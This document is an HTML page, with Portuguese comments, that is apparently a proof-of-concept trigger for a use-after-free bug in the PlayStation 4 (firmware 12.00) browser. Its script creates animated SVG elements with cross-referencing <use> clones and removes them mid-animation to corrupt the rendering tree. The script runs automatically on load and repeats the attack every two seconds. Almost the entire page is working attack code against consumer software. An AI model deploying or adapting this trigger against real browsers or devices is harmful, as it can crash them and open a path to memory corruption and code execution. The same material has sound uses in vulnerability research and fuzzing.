<!DOCTYPE html>
<html>
<head>
    <title>PS4 12.00 SVG UAF Test</title>
    <style>body { background: #300; color: #fff; text-align: center; padding-top: 50px; }</style>
</head>
<body>
    <h1>SVG Structure Fuzzer</h1>
    <p>Tentando corromper a árvore de renderização SVG...</p>
    <div id="log">Aguardando ciclo...</div>
    
    <svg id="s" width="100" height="100" style="position:absolute; top:-9999px"></svg>

    <script>
        function log(msg) { document.getElementById('log').innerText = msg; }

        function boom() {
            const svg = document.getElementById('s');
            const iterations = 50; // Quantidade de ciclos por tentativa

            log("Executando manipulação de nós SVG...");

            try {
                // 1. Cria uma estrutura complexa de clones (<use>)
                for(let i=0; i<iterations; i++) {
                    let g = document.createElementNS("http://www.w3.org/2000/svg", "g");
                    g.id = "group" + i;
                    
                    let rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
                    rect.setAttribute("width", "50");
                    rect.setAttribute("height", "50");
                    
                    // Adiciona animação que roda automaticamente
                    let anim = document.createElementNS("http://www.w3.org/2000/svg", "animate");
                    anim.setAttribute("attributeName", "width");
                    anim.setAttribute("from", "50");
                    anim.setAttribute("to", "100");
                    anim.setAttribute("dur", "0.1s");
                    anim.setAttribute("repeatCount", "indefinite");
                    
                    rect.appendChild(anim);
                    g.appendChild(rect);
                    svg.appendChild(g);

                    // Cria referências cruzadas (<use>) que complicam o Garbage Collection
                    let use = document.createElementNS("http://www.w3.org/2000/svg", "use");
                    use.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#group" + i);
                    svg.appendChild(use);
                }

                // 2. O Golpe: Remover elementos enquanto eles animam
                // Isso força o motor a lidar com ponteiros 'pendurados' (dangling pointers)
                setTimeout(() => {
                    log("Removendo elementos ativos (Trigger UAF)...");
                    while (svg.lastChild) {
                        svg.removeChild(svg.lastChild);
                    }
                    
                    // Força recálculo de estilo imediato
                    document.body.offsetWidth; 
                    
                    log("Ciclo concluído. Se o navegador está vivo, tente recarregar.");
                }, 100);

            } catch(e) {
                log("Erro JS: " + e.message);
            }
        }

        // Executa automaticamente após carregar
        setTimeout(boom, 500);
        // Repete o ataque a cada 2 segundos se não crashar
        setInterval(boom, 2000);
    </script>
</body>
</html>
